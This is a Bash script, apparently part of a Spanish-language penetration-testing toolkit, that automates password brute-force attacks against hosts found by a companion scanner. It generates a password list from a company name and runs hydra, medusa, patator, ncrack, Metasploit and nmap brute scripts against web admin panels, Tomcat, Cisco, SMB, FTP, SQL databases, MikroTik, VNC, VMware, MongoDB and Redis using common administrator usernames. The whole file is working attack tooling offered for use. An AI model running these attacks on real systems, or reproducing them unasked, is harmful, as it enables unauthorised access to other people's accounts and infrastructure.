#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
                            

max_ins=10

echo -e '  ______                  _                         __   ______ '
echo -e ' / _____)                | |                       /  | / __   |'
echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
echo ''
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while getopts ":e:d:h:" OPTIONS
do
            case $OPTIONS in
            e)     ENTIDAD=$OPTARG;;
            d)     DICTIONARY=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

ENTIDAD=${ENTIDAD:=NULL}
DICTIONARY=${DICTIONARY:=NULL}


if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Opciones: 
-e : Nombre de la empresa (Usado para generar diccionario de passwords)
 
-d :Diccionario de passwords a usar (opcional)

Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
	cracker.sh -e microsoft

Ejemplo 2: Ataque de diccionario con lista de passwords
	cracker.sh -d passwords.txt
EOF

exit
fi
######################

rm enumeracion/* 2>/dev/null
rm vulnerabilidades/* 2>/dev/null

if [ $DICTIONARY = NULL ] ; then

	echo $ENTIDAD > base.txt
	passGen.sh -f base.txt -t top200 -o top.txt 
	rm base.txt
else
	mv $DICTIONARY top.txt	

fi

echo "postgres" >> top.txt	
echo "mysql" >> top.txt	
echo "cisco" >> top.txt	

function insert_data () {
	find vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
	insert-data.py	
	mv vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	

if [ -f .servicios/admin-web.txt ]
then

	echo -e "\n\t $OKBLUE Encontre paneles de administracion web activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
			
		for line in $(cat .servicios/admin-web.txt); do
			echo -e "\n\t########### $line #######"
			ip_port=`echo $line | cut -d "/" -f 3`
			path=`echo $line | cut -d "/" -f 4`		
			ip=`echo $ip_port | cut -d ":" -f 1`
			port=`echo $ip_port | cut -d ":" -f 2`
		
			result=`webData.pl -t $ip -d "/$path/" -p $port -e todo -l /dev/null`	
			
			if [[ $result = *"phpmyadmin"* ]]; then
				echo -e "\t[+] phpMyAdmin identificado"
				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt > logs/cracking/$ip-$port-$path.txt			
				grep --color=never 'encontrado' logs/cracking/$ip-$port-$path.txt > vulnerabilidades/$ip-$port-$path.txt
			fi	
						
			if [[ $result = *"Tomcat"* ]]; then
				echo -e "\t[+] Tomcat identificado"
				patator http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-$port-passTomcat.txt								
				grep --color=never "200 OK" logs/cracking/$ip-$port-passTomcat.txt | tee -a vulnerabilidades/$ip-$port-passTomcat.txt
				
				patator http_fuzz method=GET url=$line user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-$port-passTomcat.txt
				grep --color=never '200 OK' logs/cracking/$ip-$port-passTomcat.txt | tee -a  vulnerabilidades/$ip-$port-passTomcat.txt
				
				patator http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-$port-passTomcat.txt
				grep --color=never '200 OK' logs/cracking/$ip-$port-passTomcat.txt | tee -a  vulnerabilidades/$ip-$port-passTomcat.txt
				
				patator http_fuzz method=GET url=$line user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-$port-passTomcat.txt
				grep --color=never '200 OK' logs/cracking/$ip-$port-passTomcat.txt | tee -a  vulnerabilidades/$ip-$port-passTomcat.txt
				
			fi			
		done		
		insert_data
	 fi	
fi

if [ -f .servicios/cisco.txt ]
then

	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
		for ip in $(cat .servicios/cisco.txt); do
			echo -e "\n\t########### $ip #######"			
			patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 2> logs/cracking/$ip-80-ciscoPassword.txt
			grep --color=never '200 OK' logs/cracking/$ip-80-ciscoPassword.txt | tee -a  vulnerabilidades/$ip-80-ciscoPassword.txt
			echo ""			
		done
		insert_data
	 fi	
fi


if [ -f .servicios/PRTG.txt ]
then

	echo -e "\n\t $OKBLUE Encontre PRTG activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
		for line in $(cat .servicios/PRTG.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			
			echo -e "\n\t########### $ip #######"			
			
			passWeb.pl -t $ip -p 80 -m PRTG -u prtgadmin -f top.txt > logs/cracking/$ip-PRTG-password.txt
			grep --color=never 'encontrado' logs/cracking/$ip-PRTG-password.txt | tee -a vulnerabilidades/$ip-PRTG-password.txt
			
			echo ""			
		done
		insert_data
	 fi	
fi


if [ -f .servicios/web401.txt ]
then

	echo -e "\n\t $OKBLUE Encontre web 401 activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass web ######################$RESET"	
		for ip in $(cat .servicios/web401.txt); do
			echo -e "\n\t########### $ip #######"			
			patator http_fuzz method=GET url="http://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 2>> logs/cracking/$ip-80-adminPassword.txt
			grep --color=never '200 OK' logs/cracking/$ip-80-adminPassword.txt | tee -a  vulnerabilidades/$ip-80-adminPassword.txt
			patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 2>> logs/cracking/$ip-80-rootPassword.txt
			grep --color=never '200 OK' logs/cracking/$ip-80-rootPassword.txt | tee -a  vulnerabilidades/$ip-80-rootPassword.txt
			echo ""			
		done
		insert_data
	 fi	
fi

if [ -f .servicios/Windows.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios SMB activos (Windows). Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
	 for ip in $(cat .servicios/Windows.txt); do		
		echo -e "\n\t########### $ip #######"	
		hostlive=`nmap -n -Pn -p 445 $ip`
		if [[ ${hostlive} == *"open"*  ]];then 
		
			hydra -l administrador -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l administrator -P top.txt -t 1 $ip smb >> logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l soporte -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l sistemas -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l $entidad -P top.txt -t 1 $ip smb >>  logs/cracking/$ip-windows.txt 2>/dev/null		
			egrep --color=never 'password:|login:' logs/cracking/$ip-windows.txt | tee -a vulnerabilidades/$ip-windows-password.txt
			
			#https://github.com/m4ll0k/SMBrute (shared)
		
		else
			echo "Equipo apagado"
		fi									
	 done	
	 insert_data
   fi # if bruteforce   
fi



if [ -f .servicios/ZKSoftware.txt ]
then

	echo -e "\n\t $OKBLUE Encontre servicios de ZKSoftware activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
		for ip in $(cat .servicios/ZKSoftware.txt); do
			echo -e "\n\t########### $ip #######"			
			passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt > logs/cracking/$ip-80-passwordZKSoftware.txt
			grep --color=never 'encontrado' logs/cracking/$ip-80-passwordZKSoftware.txt | tee -a vulnerabilidades/$ip-80-passwordZKSoftware.txt
			echo ""			
		done
		insert_data
	 fi	
fi

if [ -f .servicios/ftp.txt ]
then

	echo -e "\n\t $OKBLUE Encontre servicios de FTP activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
		for line in $(cat .servicios/ftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
			echo -e "\n\t########### $ip #######"			
			
			medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			medusa -e n -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			medusa -e n -u test -P top.txt -h $ip -M ftp >>  logs/cracking/$ip-ftp.txt
			grep --color=never SUCCESS logs/cracking/$ip-ftp.txt > vulnerabilidades/$ip-ftp-password.txt
			echo ""			
		done
		insert_data
	 fi	
fi


if [ -f .servicios/mssql.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios MS-SQL activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat .servicios/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/$ip-mssql.txt
		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/$ip-mssql.txt
		medusa -e n -u $entidad -P top.txt -h $ip -M mssql >>  logs/cracking/$ip-mssql.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > vulnerabilidades/$ip-mssql-password.txt
		
	 done	
	 insert_data
   fi # if bruteforce
fi


if [ -f .servicios/oracle.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios oracle activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
	  if [ $bruteforce == 's' ]
      then 
		export SQLPATH=/opt/oracle/instantclient_18_3
		export TNS_ADMIN=/opt/oracle/instantclient_18_3
		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
		export ORACLE_HOME=/opt/oracle/instantclient_18_3

	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
	 for line in $(cat .servicios/oracle.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/$ip-oracle-password.txt 2>/dev/null		
		egrep --color=never 'Found' logs/vulnerabilidades/$ip-oracle-password.txt | tee -a vulnerabilidades/$ip-oracle-password.txt
		
	 done	
	 insert_data
   fi # if bruteforce
fi

if [ -f .servicios/postgres.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios postgres activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 for line in $(cat .servicios/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
		medusa -e n -u $entidad -P top.txt -h $ip -M postgres >>  logs/cracking/$ip-postgres.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > vulnerabilidades/$ip-postgres-password.txt
		
	 done	
	 insert_data
   fi # if bruteforce
fi


if [ -f .servicios/MikroTik.txt ]
then
	echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
	  for ip in $(cat .servicios/MikroTik.txt); do		
		echo -e "\n\t########### $ip #######"			
				
		mkbrutus.py -t $ip -u admin --dictionary top.txt | tee -a  logs/cracking/$ip-MikroTik-password.txt
		mkbrutus.py -t $ip -u $entidad --dictionary top.txt | tee -a  logs/cracking/$ip-MikroTik-password.txt
		grep --color=never successful logs/cracking/$ip-MikroTik-password.txt > vulnerabilidades/$ip-MikroTik-password.txt
		
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi

if [ -f .servicios/mysql.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then        	
		echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
		for line in $(cat .servicios/mysql.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			echo -e "\n\t########### $ip #######"			
			hostlive=`nmap -n -Pn -p 3306 $ip`
			if [[ ${hostlive} == *"open"*  ]];then   	  
				medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/$ip-mysql.txt
				medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/$ip-mysql.txt
				medusa -e n -u $entidad  -P top.txt -h $ip -M mysql >>  logs/cracking/$ip-mysql.txt
				grep --color=never SUCCESS logs/cracking/$ip-mysql.txt | tee -a vulnerabilidades/$ip-mysql-password.txt
				echo ""			
			else
				echo "Host apagado"
			fi
			
			
		done
		insert_data		
	fi # if bruteforce
fi



if [ -f .servicios/vnc.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
	  for line in $(cat .servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"					
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
		then
			ncrack --user 'administrador' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/$ip-vnc-password.txt &			
			echo ""		
		else
			echo "Max instancias de ncrack ($max_ins)"
			sleep 10;
				
		fi		
		
	  done
	  
	  sleep 5
	  ### wait to finish
	  while true; do
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -gt 0 ]
		then
			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	
	  echo -e "\n\t########### Checking success #######"	
	  for line in $(cat .servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		grep --color=never "administrador" logs/cracking/$ip-vnc-password.txt > vulnerabilidades/$ip-vnc-password.txt
		echo ""			
	  done
	 
	 	 
	 insert_data
	fi # if bruteforce
fi

if [ -f .servicios/vmware.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  for line in $(cat .servicios/vmware.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt	
		#medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt
		grep --color=never SUCCESS logs/cracking/$ip-vmware.txt > vulnerabilidades/$ip-vmware-password.txt
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi


if [ -f .servicios/mongoDB.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de mongoDB activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  for line in $(cat .servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		nmap -n -sV -p $port --script=mongodb-brute $ip  > logs/cracking/$ip-monogodb-password.txt 2>/dev/null 
		grep "|" logs/cracking/$ip-monogodb.txt > vulnerabilidades/$ip-monogodb-password.txt 
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi

if [ -f .servicios/redis.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de redis activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  for line in $(cat .servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		nmap -n -sV -p $port --script=redis-brute $ip  > logs/cracking/$ip-redis-password.txt 2>/dev/null 
		grep "|" logs/cracking/$ip-redis.txt > vulnerabilidades/$ip-redis-password.txt 
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi



echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
grep -ira "timed out" * logs/cracking/*
grep -ira "Can't connect" * logs/cracking/*




exit
if [ -f .servicios/pop.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then     			
      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? $RESET"	  
	  read users_file  	  
	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass POP (lennnto) ######################$RESET"	
	  for line in $(cat .servicios/pop.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"	
		for username in $(cat $users_file); do
			echo -e "\n\t########### Testing user $username #######"			
			echo $username > base.txt
			passGen.sh -f base.txt -t top20 -o passwords2.txt
			cat passwords2.txt top.txt | sort | uniq > passwords.txt
			rm passwords2.txt
			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt | tee -a logs/cracking/$ip-pop.txt	
			#grep --color=never SUCCESS logs/cracking/$ip-pop.txt > vulnerabilidades/$ip-pop-password.txt
			echo ""			
		done			
		
		echo ""			
	 done
	 insert_data
	fi # if bruteforce
fi
	





